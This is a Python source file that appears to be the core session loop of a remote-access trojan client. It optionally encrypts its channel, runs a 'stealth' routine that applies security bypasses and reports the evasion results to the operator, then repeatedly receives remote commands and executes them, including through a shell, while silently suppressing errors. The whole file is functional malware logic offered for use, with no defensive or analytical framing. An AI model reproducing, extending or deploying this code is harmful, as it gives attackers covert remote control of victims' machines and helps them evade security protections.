from client.commands import build_client_registry
from client.modules.shell import run_command
from client.modules.stealth import apply_all_bypasses


def handle_session(sock_or_protocol, platform, encryption=False, tls=False,
                   auto_bypass=True, http_mode=False):
    if http_mode:
        protocol = sock_or_protocol
    else:
        from client.core.protocol import Protocol
        protocol = Protocol(sock_or_protocol) if not encryption else _build_encrypted(sock_or_protocol)

    from client.core.session_context import SessionContext
    ctx = SessionContext(sock=sock_or_protocol if not http_mode else None,
                         protocol=protocol, platform=platform)
    registry = build_client_registry()

    if auto_bypass and not http_mode:
        try:
            evasion_info = apply_all_bypasses()
            protocol.send(f'[evasion]\n{evasion_info}')
        except Exception:
            pass

    try:
        while True:
            command = protocol.recv()
            command = command.strip() if isinstance(command, str) else str(command)
            result = registry.dispatch(ctx, command)
            if result is False:
                break
            if result is None:
                run_command(protocol, command, ctx.proc_holder)
    except (ConnectionError, BrokenPipeError, OSError):
        pass
    finally:
        ctx.cleanup()
        if not http_mode and sock_or_protocol:
            try:
                sock_or_protocol.close()
            except Exception:
                pass


def _build_encrypted(sock):
    from client.core.encrypted_protocol import EncryptedProtocol
    proto = EncryptedProtocol(sock)
    proto.perform_key_exchange()
    return proto
